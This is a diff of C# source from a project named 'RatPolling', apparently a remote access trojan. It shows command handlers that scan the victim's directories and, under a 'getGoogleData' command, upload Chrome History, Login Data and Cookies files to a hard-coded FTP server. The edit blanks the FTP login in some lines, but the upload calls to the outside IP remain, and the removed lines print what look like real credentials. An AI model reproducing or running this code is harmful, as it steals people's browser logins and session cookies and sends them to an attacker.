@@ -103,8 +103,8 @@ namespace RatPolling
                                 StreamWriter f = new StreamWriter(@"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
                                 ScanDir(atrs[0], f);
                                 f.Close();
-                                client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
-                                client.UploadFile("ftp://31.31.196.203/logDirScan" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, @"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
+                                client.Credentials = new NetworkCredential("", "");
+                                client.UploadFile("/logDirScan" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, @"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
                             }
 
                             if (argsCommand[0] == "getGoogleData")
@@ -116,7 +116,7 @@ namespace RatPolling
                                     {
                                         using (var clienst = new WebClient())
                                         {
-                                            client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
+                                            client.Credentials = new NetworkCredential("", "");
                                             client.UploadFile("ftp://31.31.196.203/History" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "History");
                                             client.UploadFile("ftp://31.31.196.203/Login.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Login Data");
                                             client.UploadFile("ftp://31.31.196.203/Cookies.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Cookies");
